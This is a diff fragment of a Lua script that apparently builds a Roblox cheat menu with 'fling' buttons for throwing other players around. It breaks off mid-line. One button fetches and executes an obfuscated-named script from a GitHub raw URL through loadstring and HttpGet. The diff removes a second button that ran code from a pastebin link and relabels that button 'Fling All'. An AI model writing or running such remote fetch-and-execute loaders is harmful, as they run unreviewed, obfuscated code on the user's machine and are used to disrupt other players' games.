@@ -88,23 +88,11 @@ flingButton1.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'), true))()
 end)
 
--- Example button 2 inside Tab 1
+-- Example button 2 inside Tab 1 (Fling All)
 local flingButton2 = Instance.new("TextButton")
 flingButton2.Size = UDim2.new(0.2, 0, 0.1, 0)
 flingButton2.Position = UDim2.new(0.05, 0, 0.2, 0)
 flingButton2.BackgroundColor3 = Color3.new(0, 0.5, 0.2) -- Green
 flingButton2.TextColor3 = Color3.new(1, 1, 1) -- White
-flingButton2.Text = "Click Fling 2"
-flingButton2.Parent = tab1Frame
-
--- Connect event for the Fling button 2
-flingButton2.MouseButton1Click:Connect(function()
-    print("Fling button 2 clicked!")
-    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
-end)
-
--- Connect events for the Tab button
-tabButton.MouseButton1Click:Connect(function()
-    print("Switched to Fling Scripts")
-    tab1Frame.Visible = true
-end)
+flingButton2.Text = "Fling All"
+fling
